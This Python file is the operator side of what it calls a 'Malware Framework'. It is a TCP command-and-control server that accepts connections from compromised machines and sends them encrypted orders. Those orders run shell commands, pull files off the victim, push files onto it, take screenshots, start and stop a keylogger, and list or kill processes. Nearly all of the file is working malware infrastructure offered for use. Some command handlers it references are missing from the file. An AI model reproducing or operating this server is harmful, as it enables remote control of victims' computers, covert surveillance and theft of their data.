#!/usr/bin/env python3
"""
TCP C2 Server for Malware Framework
Provides command and control server functionality
"""

import socket
import threading
import time
import json
import logging
from typing import Dict, Any, List, Optional, Callable
from pathlib import Path
import select
import struct
import base64

from core.encryption import EncryptionManager
from core.utils import SystemUtils, FileUtils

logger = logging.getLogger(__name__)

class TCPC2Server:
    """TCP Command and Control Server"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize TCP C2 server"""
        self.config = config
        self.host = config.get('host', '0.0.0.0')
        self.port = config.get('port', 4444)
        self.max_clients = config.get('max_clients', 10)
        self.timeout = config.get('timeout', 30)
        
        # Encryption
        self.encryption = EncryptionManager(config.get('encryption', {}))
        
        # Server state
        self.running = False
        self.server_socket = None
        self.clients = {}  # client_id -> client_info
        self.client_counter = 0
        
        # Command handlers
        self.command_handlers = {
            'shell': self._handle_shell_command,
            'download': self._handle_download_command,
            'upload': self._handle_upload_command,
            'info': self._handle_info_command,
            'screenshot': self._handle_screenshot_command,
            'keylog': self._handle_keylog_command,
            'process': self._handle_process_command,
            'kill': self._handle_kill_command
        }
        
        # Setup logging
        self._setup_logging()
    
    def _setup_logging(self) -> None:
        """Setup C2 server logging"""
        log_dir = Path("logs")
        log_dir.mkdir(exist_ok=True)
        
        # Create C2 log file
        c2_log = log_dir / "c2_server.log"
        file_handler = logging.FileHandler(c2_log)
        file_handler.setLevel(logging.INFO)
        
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        file_handler.setFormatter(formatter)
        
        logger.addHandler(file_handler)
        logger.setLevel(logging.INFO)
    
    def start(self) -> bool:
        """Start the C2 server"""
        try:
            # Create server socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(self.max_clients)
            self.server_socket.settimeout(1)  # Non-blocking
            
            self.running = True
            
            logger.info(f"C2 server started on {self.host}:{self.port}")
            
            # Start client handler thread
            client_thread = threading.Thread(target=self._client_handler, daemon=True)
            client_thread.start()
            
            # Start command input thread
            input_thread = threading.Thread(target=self._command_input, daemon=True)
            input_thread.start()
            
            # Wait for threads
            client_thread.join()
            input_thread.join()
            
            return True
        
        except Exception as e:
            logger.error(f"Failed to start C2 server: {e}")
            return False
    
    def stop(self) -> None:
        """Stop the C2 server"""
        try:
            self.running = False
            
            # Close all client connections
            for client_id, client_info in list(self.clients.items()):
                self._disconnect_client(client_id)
            
            # Close server socket
            if self.server_socket:
                self.server_socket.close()
            
            logger.info("C2 server stopped")
        
        except Exception as e:
            logger.error(f"Error stopping C2 server: {e}")
    
    def _client_handler(self) -> None:
        """Handle incoming client connections"""
        try:
            while self.running:
                try:
                    # Accept new connections
                    client_socket, address = self.server_socket.accept()
                    
                    if len(self.clients) >= self.max_clients:
                        logger.warning(f"Max clients reached, rejecting {address}")
                        client_socket.close()
                        continue
                    
                    # Handle new client
                    self._handle_new_client(client_socket, address)
                
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        logger.error(f"Error accepting client: {e}")
        
        except Exception as e:
            logger.error(f"Client handler failed: {e}")
    
    def _handle_new_client(self, client_socket: socket.socket, address: tuple) -> None:
        """Handle new client connection"""
        try:
            client_id = self._generate_client_id()
            
            # Setup client socket
            client_socket.settimeout(self.timeout)
            
            # Create client info
            client_info = {
                'id': client_id,
                'socket': client_socket,
                'address': address,
                'connected_time': time.time(),
                'last_activity': time.time(),
                'handshake': None,
                'status': 'connected'
            }
            
            # Add to clients
            self.clients[client_id] = client_info
            
            # Start client handler thread
            thread = threading.Thread(
                target=self._handle_client,
                args=(client_id,),
                daemon=True
            )
            thread.start()
            
            logger.info(f"New client connected: {client_id} from {address}")
        
        except Exception as e:
            logger.error(f"Failed to handle new client: {e}")
            client_socket.close()
    
    def _generate_client_id(self) -> str:
        """Generate unique client ID"""
        self.client_counter += 1
        return f"client_{self.client_counter}_{int(time.time())}"
    
    def _handle_client(self, client_id: str) -> None:
        """Handle individual client communication"""
        try:
            client_info = self.clients[client_id]
            client_socket = client_info['socket']
            
            # Wait for handshake
            handshake = self._receive_data(client_socket)
            if handshake:
                try:
                    handshake_data = json.loads(handshake.decode('utf-8'))
                    client_info['handshake'] = handshake_data
                    logger.info(f"Client {client_id} handshake: {handshake_data.get('payload', 'unknown')}")
                except:
                    pass
            
            # Main client loop
            while self.running and client_id in self.clients:
                try:
                    # Receive data from client
                    data = self._receive_data(client_socket)
                    if not data:
                        break
                    
                    # Update last activity
                    client_info['last_activity'] = time.time()
                    
                    # Process received data
                    self._process_client_data(client_id, data)
                
                except socket.timeout:
                    continue
                except Exception as e:
                    logger.error(f"Error handling client {client_id}: {e}")
                    break
            
            # Client disconnected
            self._disconnect_client(client_id)
        
        except Exception as e:
            logger.error(f"Client handler failed for {client_id}: {e}")
            self._disconnect_client(client_id)
    
    def _receive_data(self, client_socket: socket.socket) -> Optional[bytes]:
        """Receive data from client"""
        try:
            # Receive data length
            length_data = client_socket.recv(4)
            if not length_data:
                return None
            
            length = struct.unpack('>I', length_data)[0]
            
            # Receive data
            data = b''
            while len(data) < length:
                chunk = client_socket.recv(min(4096, length - len(data)))
                if not chunk:
                    break
                data += chunk
            
            # Decrypt data if encryption is enabled
            if self.encryption and data:
                data = self.encryption.decrypt(data)
            
            return data
        
        except Exception as e:
            logger.error(f"Failed to receive data: {e}")
            return None
    
    def _send_data(self, client_socket: socket.socket, data: bytes) -> bool:
        """Send data to client"""
        try:
            # Encrypt data if encryption is enabled
            if self.encryption:
                data = self.encryption.encrypt(data)
            
            # Send data length
            length = len(data)
            client_socket.send(struct.pack('>I', length))
            
            # Send data
            client_socket.send(data)
            return True
        
        except Exception as e:
            logger.error(f"Failed to send data: {e}")
            return False
    
    def _process_client_data(self, client_id: str, data: bytes) -> None:
        """Process data received from client"""
        try:
            # Try to decode as JSON
            try:
                message = json.loads(data.decode('utf-8'))
                self._handle_json_message(client_id, message)
            except:
                # Handle as raw data
                self._handle_raw_data(client_id, data)
        
        except Exception as e:
            logger.error(f"Failed to process client data: {e}")
    
    def _handle_json_message(self, client_id: str, message: Dict[str, Any]) -> None:
        """Handle JSON message from client"""
        try:
            msg_type = message.get('type', 'unknown')
            
            if msg_type == 'output':
                # Command output
                output = message.get('output', '')
                logger.info(f"Client {client_id} output: {output}")
            
            elif msg_type == 'error':
                # Error message
                error = message.get('error', '')
                logger.error(f"Client {client_id} error: {error}")
            
            elif msg_type == 'info':
                # Info message
                info = message.get('info', {})
                logger.info(f"Client {client_id} info: {info}")
            
            elif msg_type == 'file':
                # File data
                self._handle_file_data(client_id, message)
            
            else:
                logger.debug(f"Unknown message type from {client_id}: {msg_type}")
        
        except Exception as e:
            logger.error(f"Failed to handle JSON message: {e}")
    
    def _handle_raw_data(self, client_id: str, data: bytes) -> None:
        """Handle raw data from client"""
        try:
            # Log raw data
            logger.info(f"Client {client_id} raw data: {len(data)} bytes")
            
            # Save to file if it looks like file data
            if len(data) > 100:  # Assume large data is file content
                filename = f"client_{client_id}_{int(time.time())}.bin"
                filepath = Path("downloads") / filename
                filepath.parent.mkdir(exist_ok=True)
                
                with open(filepath, 'wb') as f:
                    f.write(data)
                
                logger.info(f"Saved raw data to: {filepath}")
        
        except Exception as e:
            logger.error(f"Failed to handle raw data: {e}")
    
    def _handle_file_data(self, client_id: str, message: Dict[str, Any]) -> None:
        """Handle file data from client"""
        try:
            filename = message.get('filename', f'file_{int(time.time())}')
            file_data = base64.b64decode(message.get('data', ''))
            
            # Save file
            filepath = Path("downloads") / filename
            filepath.parent.mkdir(exist_ok=True)
            
            with open(filepath, 'wb') as f:
                f.write(file_data)
            
            logger.info(f"File received from {client_id}: {filepath}")
        
        except Exception as e:
            logger.error(f"Failed to handle file data: {e}")
    
    def _disconnect_client(self, client_id: str) -> None:
        """Disconnect client"""
        try:
            if client_id in self.clients:
                client_info = self.clients[client_id]
                client_socket = client_info['socket']
                
                client_socket.close()
                del self.clients[client_id]
                
                logger.info(f"Client disconnected: {client_id}")
        
        except Exception as e:
            logger.error(f"Error disconnecting client {client_id}: {e}")
    
    def _command_input(self) -> None:
        """Handle command input from operator"""
        try:
            print("\n=== C2 Server Command Interface ===")
            print("Available commands:")
            print("  list - List connected clients")
            print("  shell <client_id> <command> - Execute shell command")
            print("  info <client_id> - Get client information")
            print("  download <client_id> <remote_path> - Download file")
            print("  upload <client_id> <local_path> <remote_path> - Upload file")
            print("  screenshot <client_id> - Take screenshot")
            print("  keylog <client_id> <start|stop> - Control keylogger")
            print("  process <client_id> - List processes")
            print("  kill <client_id> <pid> - Kill process")
            print("  quit - Stop server")
            print()
            
            while self.running:
                try:
                    command = input("C2> ").strip()
                    if not command:
                        continue
                    
                    if command.lower() == 'quit':
                        break
                    
                    self._execute_command(command)
                
                except KeyboardInterrupt:
                    break
                except EOFError:
                    break
                except Exception as e:
                    logger.error(f"Command input error: {e}")
        
        except Exception as e:
            logger.error(f"Command input handler failed: {e}")
    
    def _execute_command(self, command: str) -> None:
        """Execute operator command"""
        try:
            parts = command.split()
            if not parts:
                return
            
            cmd = parts[0].lower()
            
            if cmd == 'list':
                self._list_clients()
            
            elif cmd == 'shell' and len(parts) >= 3:
                client_id = parts[1]
                shell_cmd = ' '.join(parts[2:])
                self._send_shell_command(client_id, shell_cmd)
            
            elif cmd == 'info' and len(parts) >= 2:
                client_id = parts[1]
                self._get_client_info(client_id)
            
            elif cmd == 'download' and len(parts) >= 3:
                client_id = parts[1]
                remote_path = parts[2]
                self._download_file(client_id, remote_path)
            
            elif cmd == 'upload' and len(parts) >= 4:
                client_id = parts[1]
                local_path = parts[2]
                remote_path = parts[3]
                self._upload_file(client_id, local_path, remote_path)
            
            elif cmd == 'screenshot' and len(parts) >= 2:
                client_id = parts[1]
                self._take_screenshot(client_id)
            
            elif cmd == 'keylog' and len(parts) >= 3:
                client_id = parts[1]
                action = parts[2]
                self._control_keylogger(client_id, action)
            
            elif cmd == 'process' and len(parts) >= 2:
                client_id = parts[1]
                self._list_processes(client_id)
            
            elif cmd == 'kill' and len(parts) >= 3:
                client_id = parts[1]
                pid = parts[2]
                self._kill_process(client_id, pid)
            
            else:
                print("Invalid command. Type 'help' for available commands.")
        
        except Exception as e:
            logger.error(f"Command execution failed: {e}")
    
    def _list_clients(self) -> None:
        """List connected clients"""
        if not self.clients:
            print("No clients connected.")
            return
        
        print(f"\nConnected clients ({len(self.clients)}):")
        print("-" * 80)
        print(f"{'ID':<20} {'Address':<20} {'Status':<10} {'Connected':<20}")
        print("-" * 80)
        
        for client_id, client_info in self.clients.items():
            address = f"{client_info['address'][0]}:{client_info['address'][1]}"
            connected_time = time.strftime('%H:%M:%S', 
                                         time.localtime(client_info['connected_time']))
            
            print(f"{client_id:<20} {address:<20} {client_info['status']:<10} {connected_time:<20}")
    
    def _send_shell_command(self, client_id: str, command: str) -> None:
        """Send shell command to client"""
        try:
            if client_id not in self.clients:
                print(f"Client {client_id} not found.")
                return
            
            message = {
                'type': 'command',
                'command': 'shell',
                'args': [command]
            }
            
            data = json.dumps(message).encode('utf-8')
            client_socket = self.clients[client_id]['socket']
            
            if self._send_data(client_socket, data):
                print(f"Shell command sent to {client_id}: {command}")
            else:
                print(f"Failed to send command to {client_id}")
        
        except Exception as e:
            logger.error(f"Failed to send shell command: {e}")
    
    def _get_client_info(self, client_id: str) -> None:
        """Get client information"""
        try:
            if client_id not in self.clients:
                print(f"Client {client_id} not found.")
                return
            
            client_info = self.clients[client_id]
            handshake = client_info.get('handshake', {})
            
            print(f"\nClient Information: {client_id}")
            print("-" * 40)
            print(f"Address: {client_info['address'][0]}:{client_info['address'][1]}")
            print(f"Connected: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(client_info['connected_time']))}")
            print(f"Last Activity: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(client_info['last_activity']))}")
            print(f"Status: {client_info['status']}")
            
            if handshake:
                print(f"Payload: {handshake.get('payload', 'unknown')}")
                print(f"Version: {handshake.get('version', 'unknown')}")
                print(f"OS: {handshake.get('os', {}).get('system', 'unknown')}")
                print(f"User: {handshake.get('user', 'unknown')}")
                print(f"Hostname: {handshake.get('hostname', 'unknown')}")
        
        except Exception as e:
            logger.error(f"Failed to get client info: {e}")
    
    def _download_file(self, client_id: str, remote_path: str) -> None:
        """Download file from client"""
        try:
            if client_id not in self.clients:
                print(f"Client {client_id} not found.")
                return
            
            message = {
                'type': 'command',
                'command': 'download',
                'args': [remote_path]
            }
            
            data = json.dumps(message).encode('utf-8')
            client_socket = self.clients[client_id]['socket']
            
            if self._send_data(client_socket, data):
                print(f"Download request sent to {client_id}: {remote_path}")
            else:
                print(f"Failed to send download request to {client_id}")
        
        except Exception as e:
            logger.error(f"Failed to send download command: {e}")
    
    def _upload_file(self, client_id: str, local_path: str, remote_path: str) -> None:
        """Upload file to client"""
        try:
            if client_id not in self.clients:
                print(f"Client {client_id} not found.")
                return
            
            # Read local file
            if not Path(local_path).exists():
                print(f"Local file not found: {local_path}")
                return
            
            with open(local_path, 'rb') as f:
                file_data = f.read()
            
            message = {
                'type': 'command',
                'command': 'upload',
                'args': [remote_path],
                'file_data': base64.b64encode(file_data).decode('utf-8')
            }
            
            data = json.dumps(message).encode('utf-8')
            client_socket = self.clients[client_id]['socket']
            
            if self._send_data(client_socket, data):
                print(f"Upload request sent to {client_id}: {local_path} -> {remote_path}")
            else:
                print(f"Failed to send upload request to {client_id}")
        
        except Exception as e:
            logger.error(f"Failed to send upload command: {e}")
    
    def _take_screenshot(self, client_id: str) -> None:
        """Take screenshot on client"""
        try:
            if client_id not in self.clients:
                print(f"Client {client_id} not found.")
                return
            
            message = {
                'type': 'command',
                'command': 'screenshot',
                'args': []
            }
            
            data = json.dumps(message).encode('utf-8')
            client_socket = self.clients[client_id]['socket']
            
            if self._send_data(client_socket, data):
                print(f"Screenshot request sent to {client_id}")
            else:
                print(f"Failed to send screenshot request to {client_id}")
        
        except Exception as e:
            logger.error(f"Failed to send screenshot command: {e}")
    
    def _control_keylogger(self, client_id: str, action: str) -> None:
        """Control keylogger on client"""
        try:
            if client_id not in self.clients:
                print(f"Client {client_id} not found.")
                return
            
            message = {
                'type': 'command',
                'command': 'keylog',
                'args': [action]
            }
            
            data = json.dumps(message).encode('utf-8')
            client_socket = self.clients[client_id]['socket']
            
            if self._send_data(client_socket, data):
                print(f"Keylogger {action} request sent to {client_id}")
            else:
                print(f"Failed to send keylogger request to {client_id}")
        
        except Exception as e:
            logger.error(f"Failed to send keylogger command: {e}")
    
    def _list_processes(self, client_id: str) -> None:
        """List processes on client"""
        try:
            if client_id not in self.clients:
                print(f"Client {client_id} not found.")
                return
            
            message = {
                'type': 'command',
                'command': 'process',
                'args': []
            }
            
            data = json.dumps(message).encode('utf-8')
            client_socket = self.clients[client_id]['socket']
            
            if self._send_data(client_socket, data):
                print(f"Process list request sent to {client_id}")
            else:
                print(f"Failed to send process request to {client_id}")
        
        except Exception as e:
            logger.error(f"Failed to send process command: {e}")
    
    def _kill_process(self, client_id: str, pid: str) -> None:
        """Kill process on client"""
        try:
            if client_id not in self.clients:
                print(f"Client {client_id} not found.")
                return
            
            message = {
                'type': 'command',
                'command': 'kill',
                'args': [pid]
            }
            
            data = json.dumps(message).encode('utf-8')
            client_socket = self.clients[client_id]['socket']
            
            if self._send_data(client_socket, data):
                print(f"Kill process request sent to {client_id}: PID {pid}")
            else:
                print(f"Failed to send kill request to {client_id}")
        
        except Exception as e:
            logger.error(f"Failed to send kill command: {e}")
    
    def get_status(self) -> Dict[str, Any]:
        """Get C2 server status"""
        return {
            'running': self.running,
            'host': self.host,
            'port': self.port,
            'connected_clients': len(self.clients),
            'max_clients': self.max_clients,
            'clients': list(self.clients.keys())
        } 